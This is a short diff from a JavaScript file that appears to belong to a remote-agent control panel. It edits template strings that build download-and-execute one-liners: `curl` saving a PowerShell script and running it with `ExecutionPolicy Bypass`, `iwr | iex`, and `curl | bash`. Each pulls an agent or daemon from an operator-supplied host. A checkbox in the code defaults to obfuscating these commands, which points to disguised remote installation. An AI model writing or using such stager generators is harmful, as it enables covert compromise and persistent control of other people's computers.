@@ -5237,8 +5237,8 @@
                                 const rawRemoteWin = `curl.exe -s "${scheme}://${cleanIp}${portStr}/sys-agent?client_id=${clientId}" -o "$env:TEMP\\sys.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sys.ps1"`;
                                 const rawRemoteMac = `curl -sSL "${scheme}://${cleanIp}${portStr}/sys-agent-mac?client_id=${clientId}" | bash`;
 
-                                const rawDaemonWin = `powershell -ExecutionPolicy Bypass -Command "iwr -useb ${scheme}://${cleanIp}${portStr}/api/install-daemon?os=win | iex"`;
-                                const rawDaemonMac = `curl -sSL "${scheme}://${cleanIp}${portStr}/api/install-daemon?os=mac" | bash`;
+                                const rawDaemonWin = `powershell -ExecutionPolicy Bypass -Command "iwr -useb ${scheme}://${cleanIp}${portStr}/install-daemon?os=win | iex"`;
+                                const rawDaemonMac = `curl -sSL "${scheme}://${cleanIp}${portStr}/install-daemon?os=mac" | bash`;
 
                                 const isObfuscated = document.getElementById('chkObfuscateCmds') ? document.getElementById('chkObfuscateCmds').checked : true;
 
